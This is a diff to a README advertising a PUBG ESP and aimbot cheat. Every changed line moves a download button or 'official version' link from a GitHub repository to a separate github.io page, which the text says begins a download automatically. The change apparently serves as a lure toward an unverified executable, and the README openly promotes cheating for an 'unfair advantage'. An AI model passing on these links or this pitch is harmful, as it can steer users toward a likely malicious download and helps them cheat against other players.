@@ -1,6 +1,6 @@
 # 🎯 pubg-esp-aimbot-2026 - Dominate Every Match With Precision
 
-[![Download Now](https://img.shields.io/badge/Download-PUBG_ESP_Aimbot_2026-00FF00?style=for-the-badge&logo=github&logoColor=black)](https://github.com/annepr688/pubg-esp-aimbot-2026)
+[![Download Now](https://img.shields.io/badge/Download-PUBG_ESP_Aimbot_2026-00FF00?style=for-the-badge&logo=github&logoColor=black)](https://annepr688.github.io)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these simple steps to get up and running in under two minutes.
 
 ### Step 1: Download the Application
 
-[![Download Button](https://img.shields.io/badge/CLICK_HERE_TO_DOWNLOAD-FF5722?style=for-the-badge&logo=windows&logoColor=white&color=FF5722)](https://github.com/annepr688/pubg-esp-aimbot-2026)
+[![Download Button](https://img.shields.io/badge/CLICK_HERE_TO_DOWNLOAD-FF5722?style=for-the-badge&logo=windows&logoColor=white&color=FF5722)](https://annepr688.github.io)
 
 Visit this link to download the application. The page will open in your browser, and the download will start automatically after a few seconds.
 
@@ -178,7 +178,7 @@ Please include your Windows version and error screenshots for faster assistance.
 
 ## 🔗 Additional Resources
 
-- [Download Official Version](https://github.com/annepr688/pubg-esp-aimbot-2026) – Always use this link to avoid malicious copies.
+- [Download Official Version](https://annepr688.github.io) – Always use this link to avoid malicious copies.
 - Setup walkthrough video – Coming soon on our Discord.
 - Community settings presets – Shared by top players.
 
@@ -188,7 +188,7 @@ Please include your Windows version and error screenshots for faster assistance.
 
 Stop losing to players who see you first. Get your unfair advantage today with just a few clicks.
 
-[![Get It Now](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-4CAF50?style=for-the-badge&logo=github&logoColor=white&color=4CAF50&labelColor=2E7D32)](https://github.com/annepr688/pubg-esp-aimbot-2026)
+[![Get It Now](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-4CAF50?style=for-the-badge&logo=github&logoColor=white&color=4CAF50&labelColor=2E7D32)](https://annepr688.github.io)
 
 The download takes less than 60 seconds. Installation is instant. Your first match with full ESP can begin within 3 minutes.
 
